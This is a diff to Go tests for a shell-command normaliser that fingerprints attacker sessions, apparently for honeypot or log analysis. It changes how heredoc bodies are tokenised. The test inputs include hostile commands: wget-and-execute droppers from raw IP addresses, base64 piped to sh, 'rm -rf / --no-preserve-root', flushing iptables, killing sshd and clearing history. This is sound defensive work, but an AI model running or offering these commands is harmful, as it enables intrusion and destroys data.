@@ -151,8 +151,8 @@ func FuzzNormalizeCommand(f *testing.F) {
 
 func TestHeredocAndWrappers(t *testing.T) {
 	for _, tc := range []struct{ in, want string }{
-		{"cat <<EOF\nid\nw\nuptime\nEOF", `cat << <heredoc>`},
-		{"cat <<'X' > /tmp/a\nfoo\nX\nwhoami", `cat << <heredoc> > /tmp/<f> ; whoami`},
+		{"cat <<EOF\nid\nw\nuptime\nEOF", `cat << <heredoc><nl>id<nl>w<nl>uptime`},
+		{"cat <<'X' > /tmp/a\nfoo\nX\nwhoami", `cat << <heredoc><nl>foo > /tmp/<f> ; whoami`},
 		{`nohup python3 x`, `nohup python3 x`},
 		{`sudo base64 -d f`, `sudo base64 -d f`},
 		{`x=1 md5sum f`, `x=1 md5sum f`},
@@ -160,7 +160,7 @@ func TestHeredocAndWrappers(t *testing.T) {
 		{`base64 -d <<< "Zm9v" | sh`, `base64 -d <<< <tok> | sh`},
 		{"base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x", `base64 -d <<< <tok> | sh ; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm x`},
 		// Heredoc terminator must be exact line match, not just prefix
-		{"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid", `cat << <heredoc> ; id`},
+		{"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid", `cat << <heredoc><nl>body<nl>EOF trailing<nl>wget <url> ; id`},
 		// An empty body: the newline after the delimiter word is itself the
 		// first terminator line. Consuming it before the terminator check made
 		// this heredoc swallow every later command, so any dropper prefixed
@@ -168,7 +168,7 @@ func TestHeredocAndWrappers(t *testing.T) {
 		{"cat <<EOF\nEOF\nid\nwget http://x/y", `cat << <heredoc> ; id ; wget <url>`},
 		// A quoted delimiter line is not the terminator: bash compares the
 		// raw line, so `"EOF"` must not end the body early.
-		{"cat <<EOF\nbody\n\"EOF\"\nid\nEOF\nwget http://x/y", `cat << <heredoc> ; wget <url>`},
+		{"cat <<EOF\nbody\n\"EOF\"\nid\nEOF\nwget http://x/y", `cat << <heredoc><nl>body<nl>"EOF"<nl>id ; wget <url>`},
 	} {
 		if got := norm(tc.in); got != tc.want {
 			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
@@ -379,11 +379,11 @@ func TestLeadingRedirectionKeepsProgram(t *testing.T) {
 // next newline and is still dropped).
 func TestLeadingHeredocKeepsProgram(t *testing.T) {
 	for _, tc := range []struct{ in, want, prog string }{
-		{"<<EOF python3 x\nid\nEOF\nwget http://x/y", `<< <heredoc> python3 x ; wget <url>`, "python3"},
+		{"<<EOF python3 x\nid\nEOF\nwget http://x/y", `<< <heredoc><nl>id python3 x ; wget <url>`, "python3"},
 		{`<<< x python3 y`, `<<< x python3 y`, "python3"},
 		{`<<< abc123def python3 y`, `<<< <tok> python3 y`, "python3"},
-		{"sudo <<EOF -u root python3\nbody\nEOF", `sudo << <heredoc> -u root python3`, "python3"},
-		{"cat <<EOF python3\nbody\nEOF", `cat << <heredoc> <tok>`, "cat"}, // an argument, not a program
+		{"sudo <<EOF -u root python3\nbody\nEOF", `sudo << <heredoc><nl>body -u root python3`, "python3"},
+		{"cat <<EOF python3\nbody\nEOF", `cat << <heredoc><nl>body <tok>`, "cat"}, // an argument, not a program
 	} {
 		got := NormalizeCommand(tc.in)
 		if s := strings.Join(got, " "); s != tc.want {
@@ -496,5 +496,52 @@ func TestHeredocQuotedDelimiters(t *testing.T) {
 	// Two heredocs on one line: their bodies follow in order.
 	if got := norm("cat <<A <<B\na\nA\nb\nB\nwhoami"); !strings.HasSuffix(got, "; whoami") || CommandCount([][]string{NormalizeCommand("cat <<A <<B\na\nA\nb\nB\nwhoami")}) != 2 {
 		t.Errorf("two heredocs: %q", got)
+	}
+}
+
+// A heredoc body is data inside its placeholder token: it never adds
+// commands or a program, but it is part of the fingerprint, so droppers that
+// write different scripts through the same wrapper no longer collide (audit
+// I2). The body is normalised like quoted text and bounded.
+func TestHeredocBodyIsFingerprinted(t *testing.T) {
+	const wrap = "\nEOF\nsh /tmp/.s; rm -f /tmp/.s; history -c; cd /tmp; ls"
+	a := [][]string{NormalizeCommand("cat > /tmp/.s <<EOF\nwget http://1.1.1.1/a -O /tmp/b; chmod +x /tmp/b; /tmp/b" + wrap)}
+	b := [][]string{NormalizeCommand("cat > /tmp/.s <<EOF\nrm -rf / --no-preserve-root; iptables -F; pkill -9 sshd" + wrap)}
+	if Fingerprint(Join([]string{strings.Join(a[0], tokSep)})) == Fingerprint(Join([]string{strings.Join(b[0], tokSep)})) {
+		t.Error("different heredoc bodies behind one wrapper share a fingerprint")
+	}
+	if CommandCount(a) != 6 || CommandCount(b) != 6 {
+		t.Errorf("CommandCount = %d, %d; the body must not add commands", CommandCount(a), CommandCount(b))
+	}
+	// Per-victim values in the body are normalised like quoted text.
+	c := NormalizeCommand("cat > /tmp/.s <<EOF\nwget http://9.9.9.9/zz -O /tmp/qq; chmod +x /tmp/qq; /tmp/qq" + wrap)
+	if !reflect.DeepEqual(a[0], c) {
+		t.Errorf("per-victim values changed the body:\n%q\n%q", a[0], c)
+	}
+	// A typed placeholder in the body is escaped like any attacker <.
+	if got := norm("cat <<EOF\n<nl><more>\nEOF"); got != `cat << <heredoc><nl><lt>nl<gt><lt>more<gt>` {
+		t.Errorf("literal placeholders in a body: %q", got)
+	}
+	// <<- strips the body's leading tabs as well as the terminator's.
+	if got := norm("cat <<-EOF\n\tid\n\tEOF"); got != `cat << <heredoc><nl>id` {
+		t.Errorf("<<- body: %q", got)
+	}
+	// An empty body keeps the bare placeholder; an empty line does not.
+	if got := norm("cat <<EOF\n\nEOF"); got != "cat << <heredoc><nl>" {
+		t.Errorf("one empty body line: %q", got)
+	}
+	// A large body is cut at MaxHeredocBodyBytes and marked.
+	big := strings.Repeat("x", 3000) + "\n" + strings.Repeat("y", 3000) + "\n" + strings.Repeat("z", 10)
+	got := NormalizeCommand("cat <<EOF\n" + big + "\nEOF\nid")
+	want := heredocTok + litNL + strings.Repeat("x", 3000) + litNL + strings.Repeat("y", MaxHeredocBodyBytes-3000) + litNL + litMore
+	if len(got) != 5 || got[2] != want || got[4] != "id" {
+		t.Errorf("bounded body: %d tokens, body %d bytes", len(got), len(got[2]))
+	}
+	// The body never becomes the program, even with no command word.
+	if p := program(segments([][]string{NormalizeCommand("<<EOF\nwget x\nEOF")})[0]); p != "" {
+		t.Errorf("program of a bare heredoc = %q", p)
+	}
+	if got := Display(EncodeLine("cat <<EOF > /tmp/a\nwget http://x/y\nsh a\nEOF"), 0); got != `cat << <heredoc>\nwget <url>\nsh a > /tmp/<f>` {
+		t.Errorf("Display = %q", got)
 	}
 }
